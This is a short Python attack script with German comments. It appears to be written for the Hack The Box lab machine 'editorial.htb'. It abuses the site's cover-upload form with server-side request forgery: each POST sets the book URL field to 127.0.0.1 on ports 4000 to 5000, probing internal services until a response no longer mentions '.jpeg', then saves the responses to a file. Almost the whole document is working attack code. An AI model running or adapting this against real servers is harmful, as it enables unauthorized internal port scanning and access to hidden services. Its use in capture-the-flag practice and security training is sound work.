import requests
import json
import re

# Ziel-URL für den POST-Request
url = "http://editorial.htb/upload-cover"

# Header für den Request
headers = {
    "Host": "editorial.htb",
    "Accept-Language": "de-DE,de;q=0.9",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36",
    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryEDzdVe17VgVOAPz7",
    "Accept": "*/*",
    "Origin": "http://editorial.htb",
    "Referer": "http://editorial.htb/upload",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive"
}

# Funktion, um den Request für einen bestimmten Port zu senden
def send_request(port):
    # Body für den multipart/form-data Request
    body = f"""------WebKitFormBoundaryEDzdVe17VgVOAPz7
Content-Disposition: form-data; name="bookurl"

http://127.0.0.1:{port}
------WebKitFormBoundaryEDzdVe17VgVOAPz7
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryEDzdVe17VgVOAPz7--"""

    # Senden des Requests
    response = requests.post(url, headers=headers, data=body)
    return response.text

# Dictionary, um die Antworten für alle Ports zu speichern
responses = {}

# Regex für das Erkennen von .jpeg im Response-Body
jpeg_pattern = re.compile(r"\.jpeg", re.IGNORECASE)

# Ports von 1 bis 65535 durchgehen
for port in range(4000, 5001):
    print(f"Sende Anfrage an Port {port}...")
    response_body = send_request(port)
    # Prüfen, ob der Response-Body keine .jpeg-Erwähnung enthält
    if not jpeg_pattern.search(response_body):
        print(f"Antwort bei Port {port} enthält kein '.jpeg': Schleife wird abgebrochen.")
        responses[f"port{port}"] = response_body
        break
    # Speichern der Antwort, wenn der Body eine .jpeg-Erwähnung enthält
    responses[f"port{port}"] = response_body

# Ergebnisse als JSON-Datei speichern
output_data = {"responses": responses}
with open("responses.json", "w") as output_file:
    json.dump(output_data, output_file, indent=4)

print("Das Skript wurde beendet, und die Antworten wurden in 'responses.json' gespeichert.")

